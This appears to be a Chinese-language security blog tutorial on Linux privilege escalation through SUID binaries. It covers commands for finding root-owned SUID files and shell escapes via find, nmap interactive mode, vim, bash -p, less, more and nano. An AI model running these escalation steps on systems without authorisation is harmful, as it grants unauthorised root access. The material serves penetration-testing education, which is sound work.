---
title: Linux渗透 SUID提权
description: Linux渗透 SUID提权
pubDate: 11 11 2024
image: https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-12.webp
categories:
  - 网络安全
tags:
  - 提权
  - Linux
---

## SUID

> SUID（Set User ID）是Linux和Unix系统中一种文件权限位，允许用户在执行文件时以文件所有者的身份运行该程序，而不是执行者的身份。通常，这在需要特定权限的程序中使用，例如需要以 root 权限执行的程序，方便非 root 用户运行而无需直接授予他们 root 权限。

SUID 的特点是用户运行某个程序时，如果该程序有 SUID 权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。

比如普通用户张三想要运行一个程序，而这个程序需要有李四的权限，那么就可以为这个程序设置 SUID，当张三运行这个程序的时候就会拥有李四的权限，从而去运行这个程序。而如果，这里李四是 root 用户，那么张三在运行这个程序时，就是以 root 用户权限去运行的。

我们可以利用这个特性去进行提权

## 设置 SUID

通过如下命令进行设置

```shell
chmod u+s filename 设置SUID位
chmod u-s filename 去掉SUID设置
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-1.webp)

可以看到，在设置 SUID 后，权限中 x 的位置变成了 S

## SUID 利用

当前权限如下

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-2.webp)

### SUID 文件收集

首先是要去收集存在 SUID 的文件

```shell
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

- 命令一： `find / -perm -u=s -type f 2>/dev/null`
  - 解释：在根目录 `/` 下递归查找所有具有 SUID 权限的文件。
  - 参数说明：
    - `-perm -u=s`：表示查找设置了 SUID 位的文件（以拥有者身份执行）。
    - `-type f`：只查找文件（不包括目录、链接等其他类型）。
    - `2>/dev/null`：将错误输出重定向到 `/dev/null`，隐藏因为权限不足导致的错误消息。
  - 目的：查找系统中所有具有 SUID 权限的文件，以检查可能存在的提权漏洞。

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-3.webp)

- 命令二： `find / -user root -perm -4000 -print 2>/dev/null`
  - 解释：在根目录下查找所有具有 SUID 权限且文件拥有者是 `root` 的文件。
  - 参数说明：
    - `-user root`：限定文件拥有者为 `root` 用户。
    - `-perm -4000`：查找具有 `4000` 权限的文件，即 SUID 位被设置的文件。
    - `-print`：输出找到的文件路径。
    - `2>/dev/null`：将错误信息重定向到 `/dev/null`，隐藏错误消息。
  - 目的：查找系统中以 `root` 身份执行的 SUID 文件，这些文件如果存在安全漏洞，可能被用于提权到 `root`。

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-4.webp)

- 命令三： `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
  - 解释：在根目录下查找所有具有 SUID 权限且拥有者是 `root` 的文件，并详细列出这些文件的权限和信息。
  - 参数说明：
    - `-user root`：限定文件拥有者为 `root` 用户。
    - `-perm -4000`：查找具有 `4000` 权限的文件，即 SUID 位被设置的文件。
    - `-exec ls -ldb {}`：对找到的每个文件执行 `ls -ldb` 命令，详细列出文件的权限、所有者等信息。
    - `{}`：表示找到的文件路径会插入到 `{}` 中。
  - 目的：不仅查找 SUID 文件，还通过 `ls -ldb` 详细列出文件权限、所有者等信息，有助于进一步分析这些文件的潜在风险。

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-5.webp)

### find 提权

如果 find 拥有 SUID 权限的话，我们可以利用它进行提权

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-6.webp)

find 命令需要指向一个文本文件，就以 `/etc/passwd` 为例

```shell
find /etc/passwd -exec whoami \;
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-7.webp)

成功以 root 权限去执行了 `whoami`。我们可以用这种方式去执行各种命令

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-8.webp)

### nmap 提权

在早期 nmap 版本中，带有交互模式，因而允许用户执行shell命令。

适用版本：nmap 2.02 至 5.21

使用如下命令进入nmap交互模式:

```css
nmap --interactive
```

在nmap交互模式中 通过如下命令提权

```shell
nmap> !sh
sh-3.2# whoami
root
```

### Vim 提权

要先打开一个文件

```
vim /etc/passwd
```

然后进入 vim 命令模式，通过vim进入shell

```shell
:set shell = '/usr/bin/sh'
:shell
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-9.webp)

### Bash 提权

以下命令将以 root 身份打开一个 bash shell。

```bash
bash -p
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-10.webp)

### less 提权

less 命令也可以进入 Shell

```bash
less /etc/passwd
```

在 less 中输入：`!/bin/sh`

注意：要读取一个比较大的文件，如果文件太小无法进入翻页功能也就无法使用 `!` 命令进入 shell

### more 提权

more命令进入 shell 和 less 相同

```bash
more /etc/passwd
#在more中输入:
!/bin/sh
```

注意：要读取一个比较大的文件，如果文件太小无法进入翻页功能也就无法使用 `!` 命令进入 shell

### nano 提权

nano 进入 shell 的方法为

```
nano #进入nano编辑器
Ctrl + R
Ctrl + X
#即可输入命令
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83/001%20Linux%E6%B8%97%E9%80%8F%20SUID%E6%8F%90%E6%9D%83-11.webp)

## 总结

其实就是用属主为 root 用户，拥有 SUID 的可执行文件去执行命令，除了上面说的那些，什么 python，perl，man 等等工具脚本，

只要是满足下面的条件都可以去利用

- 有 SUID，
- 属主是对应权限用户
- 是可执行文件
- 可以通过不同的方式去执行命令
